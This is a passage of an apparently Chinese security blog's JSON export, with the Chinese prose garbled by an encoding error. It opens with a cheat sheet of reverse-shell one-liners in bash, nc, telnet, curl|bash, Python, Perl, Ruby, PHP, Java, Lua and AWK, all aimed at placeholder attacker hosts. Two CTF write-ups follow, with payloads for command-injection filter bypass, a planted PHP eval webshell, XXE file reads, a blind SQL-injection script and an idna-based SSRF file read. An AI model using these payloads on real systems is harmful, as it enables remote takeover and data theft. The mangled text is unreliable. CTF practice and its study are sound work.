çš„è¯æœåŠ¡ç«¯ä»…ä¼šå‘é€ä¸€ä¸ªTCP /dev/tcp/æ”»å‡»ä¸»æœºip/portè¡¨ç¤ºæ˜¯è°ƒç”¨socketï¼Œå»ºç«‹socketè¿æ¥ 0&gt;&amp;1è¡¨ç¤ºæ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œå®ç°ä½ ä¸åå¼¹å‡ºæ¥çš„shellçš„äº¤äº’ bashæ–¹æ³•çš„åå¼¹shellè¿˜æœ‰å…¶ä»–æ–¹æ³•å¯ä»¥å®ç°ï¼Œä¾‹å¦‚ï¼š 12exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done ç¬¬ä¸€æ¡å‘½ä»¤å»ºç«‹tcpè¿æ¥ï¼Œå¹¶å°†æ ‡å‡†è¾“å…¥è¾“å‡ºä½œä¸ºdevice 5çš„æ ‡å‡†è¾“å…¥è¾“å‡ºã€‚ç¬¬äºŒæ¡cat &lt;&amp;5è·å–device5çš„è¾“å…¥ï¼›while read line; do $line 2&gt;&amp;5 &gt;&amp;5ä¸€æ—¦è·å–åˆ°å‘½ä»¤ä¾¿è¿è¡Œï¼Œç„¶åå°†æ ‡å‡†è¾“å…¥è¾“å‡ºä»¥åŠæ ‡å‡†é”™è¯¯è¾“å‡ºåˆ°device5ä¸­ã€‚ æˆ–è€…ï¼š 12345exec 0&amp;0 2&gt;&amp;00&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/port; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196/bin/bash -i &gt; /dev/tcp/attackerip/port 0&lt;&amp;1 2&gt;&amp;1å…³é—­è®¾å¤‡ ç”¨ exec [num]&gt;&amp;- åŸç†éƒ½æ˜¯ç±»ä¼¼çš„ï¼Œä½†æ˜¯ç”±äºlinuxå‘è¡Œç‰ˆçš„ä¸åŒï¼Œå¯¼è‡´ä¸€äº›ç‰ˆæœ¬ä¸èƒ½è¿›è¡Œbashåå¼¹shellï¼Œä¾‹å¦‚ubuntuã€‚ ncåå¼¹å‘½ä»¤1ï¼š 1nc -e /bin/bash x.x.x.x port è¿™ä¸ªä½¿ç”¨ä¹ŸæŒºå¤šçš„ï¼Œä½†æ˜¯å¦‚æœæœåŠ¡å™¨æ²¡æœ‰è£…ncæˆ–è€…ncä¸å¸¦eå‚æ•°å°±ç”¨ä¸äº†äº†ï¼Œå› æ­¤è¿™æ—¶å€™å°±è¦ç”¨ä»–çš„ä»£é¤äº†ï¼ˆbushiï¼‰ã€‚ å‘½ä»¤2ï¼š 1rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc x.x.x.x port &gt;/tmp/f åŒæ ·è§£é‡Šä¸€ä¸‹ï¼š rm /tmp/f åˆ é™¤å‘½ä»¤ mkfifo /tmp/f; åœ¨tmpç›®å½•ä¸‹å†™fifoæ–‡ä»¶f /bin/sh -i 2&gt;&amp;1 å°†/bin/shçš„æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º nc x.x.x.x 2333 &gt;/tmp/få°†ncç›‘å¬åˆ°çš„è¾“å…¥è¾“å…¥åˆ°fifo æ³¨æ„ï¼Œåº”è¯¥æ˜¯å…ˆè·å¾—è¾“å…¥è¾“å‡ºç„¶åå°†ç»“æœé€šè¿‡ç®¡é“åˆ°ncå®¢æˆ·ç«¯ å‘½ä»¤3ï¼š 1nc x.x.x.x port1|/bin/bash|nc x.x.x.x port2 è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œä»port1ç«¯å£è·å–å‘½ä»¤ï¼Œbashè¿è¡Œåå°†ç»“æœè¿”å›åˆ°port2ä¸­ã€‚ telnetåå¼¹ä½¿ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œéœ€è¦ç›‘å¬ä¸¤ä¸ªç«¯å£ï¼Œæ¥ç€åœ¨ç›®æ ‡ä¸»æœºæ‰§è¡Œå‘½ä»¤ï¼š 1telnet x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 å¾—åˆ°åå¼¹shellåï¼Œport1ç»ˆç«¯è¾“å…¥å‘½ä»¤ï¼Œport2ç»ˆç«¯å°±ä¼šè·å¾—æ‰§è¡Œç›¸åº”å‘½ä»¤åçš„ç»“æœã€‚ curlåå¼¹åœ¨vpsä¸Šå…ˆæ”¾ä¸€ä¸ªè„šæœ¬ï¼Œå†…å®¹å°±æ˜¯bashåå¼¹çš„payloadï¼Œç„¶åæ‰§è¡Œå‘½ä»¤å°±å¯ä»¥äº†ï¼š 1curl x.x.x.x/bash |bash å¸¸è§çš„è„šæœ¬åå¼¹pythonexpï¼š 1python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;x.x.x.x&#x27;,port);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot; perlexp1ï¼š 1perl -e &#x27;use Socket;$i=&quot;[x.x.x.x]&quot;;$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; exp2: 1perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;x.x.x.x:port&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27; Rubyexp: 1ruby -rsocket -e &#x27;exit if fork;c=TCPSocket.new(&quot;x.x.x.x&quot;,&quot;port&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27; PHPexpï¼š 1php -r &#x27;$sock=fsockopen(&quot;x.x.x.x&quot;,port);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; Javaexp: 12345678910111213 public class Revs &#123; /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception &#123; // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/x.x.x.x/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;&#125;; Process p = r.exec(cmd); p.waitFor(); &#125;&#125; Luaexp: 1lua -e &quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;x.x.x.x&#x27;,&#x27;port&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot; AWKæ”»å‡»æœºå™¨ç”¨çš„ç›‘å¬ï¼Œä¸èƒ½è¾“å…¥enterï¼Œå¦åˆ™ä¼šæ–­å¼€ã€‚expï¼š 1awk &#x27;BEGIN&#123;s=&quot;/inet/tcp/0/x.x.x.x/port&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27; æ€»ç»“ä¸Šé¢é‚£äº›åå¼¹shellçš„æ–¹æ³•æœ‰äº›å·²ç»é€šè¿‡åšé¢˜å­¦ä¹ è¿‡ï¼Œæœ‰äº›é€šè¿‡æœ¬åœ°è¯•éªŒè¿‡ï¼Œè€Œæœ‰äº›è¿˜æ²¡æœ‰æµ‹è¯•è¿‡ï¼Œè¿™ç¯‡åšå®¢ä¸»è¦æ˜¯è¿›è¡Œè®°å½•ï¼Œå¦‚æœç¢°åˆ°ä»€ä¹ˆæ–°çš„æ–¹æ³•ä¹Ÿä¼šè¿›è¡Œè¡¥å……ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -shell","slug":"web-shell","permalink":"http://example.com/tags/web-shell/"}]},{"title":"NSSCTFç»ƒä¹ 2","slug":"NSSCTFç»ƒä¹ 2","date":"2022-03-12T08:20:08.000Z","updated":"2022-03-13T05:57:14.417Z","comments":true,"path":"2022/03/12/NSSCTFç»ƒä¹ 2/","link":"","permalink":"http://example.com/2022/03/12/NSSCTF%E7%BB%83%E4%B9%A02/","excerpt":"å‰è¨€ ç»§ç»­åˆ·NSSCTFï¼Œwebçš„å†…å®¹è¿˜æ˜¯å¾ˆæ‚çš„ï¼Œå¤šåˆ·é¢˜è¿˜æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ã€‚","text":"å‰è¨€ ç»§ç»­åˆ·NSSCTFï¼Œwebçš„å†…å®¹è¿˜æ˜¯å¾ˆæ‚çš„ï¼Œå¤šåˆ·é¢˜è¿˜æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šä¸œè¥¿çš„ã€‚ finalrceå®¡è®¡ä»£ç ï¼š 123456789101112131415 &lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;url&#x27;]))&#123; $url=$_GET[&#x27;url&#x27;]; if(preg_match(&#x27;/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\&quot;|\\&gt;|\\&lt;|\\%|\\$/i&#x27;,$url)) &#123; echo &quot;Sorry,you can&#x27;t use this.&quot;; &#125; else &#123; echo &quot;Can you see anything?&quot;; exec($url); &#125;&#125; è¿™é¢˜ä¹Ÿæ˜¯è¿‡æ»¤æ¯”è¾ƒç‹ çš„rceï¼Œè€Œä¸”ä½¿ç”¨çš„æ˜¯exec()ï¼Œè¿™ä¸ªå‡½æ•°æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼ŒæŒ‰å¹³å¸¸æ¥è¯´å¯ä»¥åå¼¹shellï¼Œä½†è¿™é‡Œçš„è¿‡æ»¤å¤ªç‹ äº†ï¼Œå‡ ä¹å µæ­»è¿™æ¡è·¯äº†ã€‚å› æ­¤æˆ‘ä»¬è¦å­¦ä¹ ä¸€ä¸ªç‰¹æ®Šçš„linuxå‘½ä»¤ï¼štee teeï¼šå°†æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤å†™è¿›æ–‡ä»¶ä¸­ï¼Œå½“è®¿é—®è¿™ä¸ªæ–‡ä»¶åæ‰§è¡Œå‘½ä»¤ å› æ­¤æˆ‘ä»¬æ„å»ºè¿™æ ·çš„payloadï¼š 1dir /|tee mrl64 æ¥ç€æˆ‘ä»¬è®¿é—®/mrl64ï¼Œå°±å¯ä»¥è¯»å–åˆ°æ ¹ç›®å½•äº†ï¼Œcatè¢«è¿‡æ»¤äº†ï¼Œè§£å†³æ–¹æ³•è¿˜æ˜¯å¾ˆå¤šçš„ï¼Œä¹‹å‰å†™åˆ°çš„æ— å­—ç¬¦webshellå°±å¯ä»¥åˆ©ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨å¼•å·è¿›è¡Œç»•è¿‡ï¼Œä¹Ÿå¯ä»¥ç”¨sortä»£æ›¿ï¼Œç­‰ç­‰ï¼Œè¿™é‡Œç»™å‡ºä¸€ç§payloadï¼š 1?url=sort /flllll&#x27;&#x27;aaaaaaggggggg|tee mrl64 [CSAWQual 2019]Unagiä¸€è¿›ç½‘é¡µå…ˆåˆ°å¤„ç¿»ç¿»ï¼Œå‘ç°æç¤ºï¼š 12345678910111213141516&lt;users&gt; &lt;user&gt; &lt;username&gt;alice&lt;/username&gt; &lt;password&gt;passwd1&lt;/password&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;email&gt;alice@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;/user&gt;&lt;/users&gt; æ˜æ˜¾çš„xeeï¼Œç»“åˆæç¤ºflagåœ¨/flagä¸‹ï¼Œæˆ‘ä»¬ç›´æ¥æ„é€ payloadï¼š 12345678910111213&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE users[&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;users&gt; &lt;user&gt; &lt;username&gt;bob&lt;/username&gt; &lt;password&gt;passwd2&lt;/password&gt; &lt;name&gt; Bob&lt;/name&gt; &lt;email&gt;bob@fakesite.com&lt;/email&gt; &lt;group&gt;CSAW2019&lt;/group&gt; &lt;intro&gt;&amp;payload;&lt;/intro&gt; &lt;/user&gt;&lt;/users&gt; ä¸Šä¼ 1.xmlï¼Œç»“æœå‘ç°æœ‰wafï¼Œå°è¯•ç”¨utf-16ç¼–ç ï¼š 1iconv -f utf8 -t utf16 1.xml&gt;2.xml å†æ¬¡ä¸Šä¼ å³å¯è·å–flagã€‚ hardrce_3å®¡è®¡æºç ï¼š 12345678910111213141516171819202122232425 &lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123; $wllm = $_GET[&#x27;wllm&#x27;]; $blacklist = [&#x27; &#x27;,&#x27;\\^&#x27;,&#x27;\\~&#x27;,&#x27;\\|&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123; die(&quot;å°ä¼™å­åªä¼šå¼‚æˆ–å’Œå–åï¼Ÿä¸å¥½æ„æ€å“¦LTLTè¯´ä¸èƒ½ç”¨ï¼ï¼&quot;); &#125;&#125;if(preg_match(&#x27;/[a-zA-Z0-9]/is&#x27;,$wllm))&#123; die(&quot;Ra&#x27;sAlGhulè¯´ç”¨å­—æ¯æ•°å­—æ˜¯æ²¡æœ‰çµé­‚çš„ï¼&quot;);&#125;echo &quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;;eval($wllm);&#125;else&#123; echo &quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;;&#125;?&gt; è¿™é¢˜æŠŠå–åå’Œå¼‚æˆ–å…¨ç»™ç¦äº†ï¼Œæˆ‘ä»¬é‡‡ç”¨è‡ªå¢çš„æ–¹å¼æ„å»ºpayloadï¼Œè®°å¾—urlç¼–ç ï¼š 1http://1.14.71.254:28041/?wllm=%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B%27%21%27%3D%3D%27%40%27%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D%27_%27%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___%28%24_%5B_%5D%29%3B è¿™æ ·æˆ‘ä»¬å°±å†™å…¥äº†ä¸€ä¸ªwebshellï¼ŒæŸ¥çœ‹phpinfoï¼Œå‘ç°ä¸€äº›ç³»ç»Ÿå‡½æ•°è¢«ç¦ç”¨ï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥ä¸Šä¼ ä¸€ä¸ªä¸€å¥è¯ï¼š 1_=file_put_contents(&#x27;1.php&#x27;,&#x27;&lt;?php @eval($_POST[&#x27;mrl64&#x27;]);?&gt;&#x27;); èšå‰‘è¿æ¥å³å¯ã€‚ [é¹¤åŸæ¯ 2021]Middle magicå®¡è®¡æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152 &lt;?phphighlight_file(__FILE__);include &quot;./flag.php&quot;;include &quot;./result.php&quot;;if(isset($_GET[&#x27;aaa&#x27;]) &amp;&amp; strlen($_GET[&#x27;aaa&#x27;]) &lt; 20)&#123; $aaa = preg_replace(&#x27;/^(.*)level(.*)$/&#x27;, &#x27;$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;&#x27;, $_GET[&#x27;aaa&#x27;]); if(preg_match(&#x27;/pass_the_level_1#/&#x27;, $aaa))&#123; echo &quot;here is level 2&quot;; if (isset($_POST[&#x27;admin&#x27;]) and isset($_POST[&#x27;root_pwd&#x27;])) &#123; if ($_POST[&#x27;admin&#x27;] == $_POST[&#x27;root_pwd&#x27;]) echo &#x27;&lt;p&gt;The level 2 can not pass!&lt;/p&gt;&#x27;; // START FORM PROCESSING else if (sha1($_POST[&#x27;admin&#x27;]) === sha1($_POST[&#x27;root_pwd&#x27;]))&#123; echo &quot;here is level 3,do you kown how to overcome it?&quot;; if (isset($_POST[&#x27;level_3&#x27;])) &#123; $level_3 = json_decode($_POST[&#x27;level_3&#x27;]); if ($level_3-&gt;result == $result) &#123; echo &quot;success:&quot;.$flag; &#125; else &#123; echo &quot;you never beat me!&quot;; &#125; &#125; else&#123; echo &quot;out&quot;; &#125; &#125; else&#123; die(&quot;no&quot;); &#125; // perform validations on the form data &#125; else&#123; echo &#x27;&lt;p&gt;out!&lt;/p&gt;&#x27;; &#125; &#125; else&#123; echo &#x27;nonono!&#x27;; &#125; echo &#x27;&lt;hr&gt;&#x27;;&#125;?&gt; ç¬¬ä¸€å…³æ˜¯ä¼ å…¥aaaï¼Œè¦æ±‚å†…å®¹ä¸ºpass_the_level_1#ï¼Œä½†æ˜¯ä¸èƒ½åŒ¹é…åˆ°levelï¼Œè€è€ƒç‚¹äº†ï¼Œè¿™é‡Œç”¨%0aæˆªæ–­ã€‚ æ¥ç€æ˜¯ç¬¬äºŒå…³ï¼ŒPOSTadminå‚æ•°å’Œroot_pwdå‚æ•°ï¼Œè¦æ±‚ä¸¤è€…å€¼ä¸ç­‰ä½†æ˜¯sha1çš„å€¼è¦ç›¸ç­‰ï¼Œä¹Ÿæ˜¯è€è€ƒç‚¹ï¼Œæ•°ç»„å°±è¡Œã€‚ æœ€åä¸€å…³ï¼Œä¼ å…¥level_3å‚æ•°ï¼Œè¦æ±‚è¿™ä¸ªå‚æ•°çš„å†…å®¹ç»è¿‡jsonè§£ç åçš„resultçš„å€¼èƒ½å¤Ÿç­‰äº$resultã€‚è¿™ä¸ªå˜é‡çš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œä½†ä¸é‡è¦ï¼Œresultä¸º0å°±å¯ä»¥äº†ã€‚ æœ€ç»ˆpayloadï¼š 12?aaa=%0apass_the_level_1%23POST:admin[]=1&amp;root_pwd[]=2&amp;level_3=&#123;&quot;result&quot;:0&#125; [NCTF 2019]SQLiè¿›å…¥ç½‘é¡µæ˜¯ä¸€ä¸ªç™»å½•æ¡†ï¼ŒåŒæ—¶è¿˜ç»™äº†sqlæŸ¥è¯¢è¯­å¥ï¼š 1sqlquery : select * from users where username=&#x27;&#x27; and passwd=&#x27;&#x27; å°è¯•ä¿¡æ¯æœé›†ï¼Œå‘ç°robots.txtï¼Œè®¿é—®å¹¶å‘ç°hint.txtï¼š 123456$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\\&#x27;|=| |in|&lt;|&gt;|-|\\.|\\(\\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;If $_POST[&#x27;passwd&#x27;] === admin&#x27;s password,Then you will get the flag; çœ‹å¾—å‡ºæ¥ï¼Œè¿™è¿‡æ»¤å¤ªç‹ æ¯’äº†ï¼Œä½†æ˜¯åˆæç¤ºæˆ‘ä»¬åªè¦å¾—åˆ°å¯†ç å°±å¯ä»¥äº†ï¼Œè¿™è®©æˆ‘ä»¬æƒ³èµ·äº†hgameç¬¬ä¸‰å‘¨çš„é‚£é¢˜ç›²æ³¨ã€‚ä½†æ˜¯likeè¢«è¿‡æ»¤äº†ï¼Œå› æ­¤æˆ‘ä»¬ä½¿ç”¨regexpæ¥è¿›è¡ŒåŒ¹é…ã€‚ è¿˜æœ‰ä¸€ç‚¹ï¼Œå¦‚æœç›´æ¥ä»pythonä¼ å…¥%00ä¼šè¢«è½¬ä¹‰ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨parse.unquote(&#39;%00&#39;)æ¥é¿å…è¿™ä¸€æƒ…å†µã€‚ expï¼š 1234567891011121314151617181920212223import requestsimport stringfrom urllib import parsestrs = string.ascii_lowercase + string.ascii_uppercase + string.digits + &quot;_&quot;url = &quot;http://1.14.71.254:28053/index.php&quot;name = &#x27;&#x27;for i in range(0, 100): for j in strs: z = name + j payload = &quot;||passwd/**/regexp/**/\\&quot;^&#123;&#125;\\&quot;;&#123;&#125;&quot;.format(z, parse.unquote(&#x27;%00&#x27;)) data = &#123; &quot;username&quot;: &quot;\\\\&quot;, &quot;passwd&quot;: payload &#125; r = requests.post(url, data=data) if &quot;welcome&quot; in r.text: name += j print(name) breakprint(name) è·å¾—å¯†ç åç™»é™†å¾—åˆ°flagã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-write up -ctf -web","slug":"write-up-ctf-web","permalink":"http://example.com/tags/write-up-ctf-web/"}]},{"title":"buuç»ƒä¹ 6","slug":"buuç»ƒä¹ 6","date":"2022-03-11T07:53:06.000Z","updated":"2022-03-11T13:44:44.008Z","comments":true,"path":"2022/03/11/buuç»ƒä¹ 6/","link":"","permalink":"http://example.com/2022/03/11/buu%E7%BB%83%E4%B9%A06/","excerpt":"å‰è¨€ è¿˜æ˜¯å‡‘å­—æ•°ç”¨çš„ï¼Œå‰è¨€æ€»è¦æœ‰ç‚¹å­—åœ¨ï¼Œæ‰ä¸æ˜¾å¾—ç©ºè¡è¡çš„ã€‚","text":"å‰è¨€ è¿˜æ˜¯å‡‘å­—æ•°ç”¨çš„ï¼Œå‰è¨€æ€»è¦æœ‰ç‚¹å­—åœ¨ï¼Œæ‰ä¸æ˜¾å¾—ç©ºè¡è¡çš„ã€‚ [SUCTF 2019]Pythonginxå®¡è®¡æºç ï¼Œè‡ªå·±æ•´ç†äº†ä¸‹ï¼š 1234567891011121314151617181920@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;æˆ‘æ‰Œ your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #å»æ‰ url ä¸­çš„ç©ºæ ¼ finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;æˆ‘æ‰Œ your problem? 333&quot; ä¸€æ®µpythonï¼Œç®€å•æ¥è¯´å°±æ˜¯åˆšå¼€å§‹ä¼ å…¥æ—¶ä¸èƒ½è®©parse.urlparse(url).hostnameå’Œparts[1]çš„å€¼ä¸ºsuctf.ccï¼Œä½†æ˜¯åœ¨ç»è¿‡forå¾ªç¯çš„å¤„ç†åè¦è®©è¿™ä¸ªå€¼å˜ä¸ºsuctf.ccã€‚forå¾ªç¯ä¸­æ˜¯æŠŠurlæŒ‰ç…§ç‚¹åˆ†å‰²åˆ†åˆ«è¿›è¡Œidnaç¼–ç åå†è¿›è¡Œutf-8è§£ç ã€‚ æ–¹æ³•ä¸€ä¸€æ—¶åŠä¼šä¹Ÿæ²¡å•¥æƒ³æ³•ï¼Œå°±æŠŠæºç æ‰”pythonè·‘ä¸‹è¯•è¯•ï¼Œç»è¿‡å¤šæ¬¡æµ‹è¯•å‘ç°äº†ä¸€ä¸ªç»•è¿‡æ–¹æ³•ï¼š 12345678910111213141516171819202122from urllib.parse import urlsplit,urlunsplit, unquotefrom urllib import parseurl = &quot;http:////suctf.cc/&quot;host = parse.urlparse(url).hostnameprint(host)parts = list(urlsplit(url))host = parts[1]print(host)newhost = []for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostnameprint(host)//OutPut:Nonesuctf.cc å†ç”¨ä»»æ„æ–‡ä»¶è¯»å–nginxçš„é…ç½®æ–‡ä»¶ï¼š 1file:////suctf.cc/usr/local/nginx/conf/nginx.conf æœ€åè¯»å–flagï¼š 1file:////suctf.cc/usr/fffffflag æ–¹æ³•äºŒè¿™ä¸ªæ–¹æ³•åˆ©ç”¨çš„æ˜¯idnaè§£ç ä¸utf-8è§£ç åæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå­—ç¬¦ä¼šæ”¹å˜å¾—åˆ°ä¸€ä¸ªæˆ‘ä»¬éœ€è¦çš„å­—æ¯ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è„šæœ¬æµ‹è¯•ä¸‹ï¼š 12345678910# coding:utf-8 for i in range(128,65537): tmp=chr(i) try: res = tmp.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;) if(&quot;-&quot;) in res: continue print(&quot;U:&#123;&#125; A:&#123;&#125; ascii:&#123;&#125; &quot;.format(tmp, res, i)) except: pass å‘ç°ç¡®å®å­˜åœ¨å¾ˆå¤šè¿™æ ·çš„å­—ç¬¦ï¼Œå› æ­¤ç”¨å…¶ä¸­ä¸€ä¸ªæ¥æ›¿ä»£å°±å¯ä»¥äº†ï¼Œpayloadï¼š 12file:////suctf.câ’¸/usr/local/nginx/conf/nginx.conffile:////suctf.câ’¸/usr/fffffflag è¿™é‡Œä¹Ÿé¡ºä¾¿å†å†™ä¸‹nginxçš„å¸¸è§ç›®å½•ï¼š é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service 